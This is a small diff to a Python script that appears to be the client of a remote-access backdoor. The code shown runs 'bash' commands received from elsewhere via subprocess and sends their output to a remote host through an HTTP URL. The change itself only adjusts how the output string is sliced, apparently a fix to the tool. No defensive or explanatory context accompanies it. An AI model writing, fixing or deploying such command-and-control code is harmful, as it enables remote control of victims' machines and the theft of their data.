@@ -21,7 +21,7 @@ while True:
     if commands[0] == 'bash':
         process = subprocess.Popen(commands[1].split(), stdout=subprocess.PIPE)
         output, error = process.communicate()
-        output = str(output)[2:-5]
+        output = str(output)[2:-1]
         print(output)
         urllib.request.urlopen('http://' + host + "/out/" + hostname + "/" + str(output) + "/")
     else:
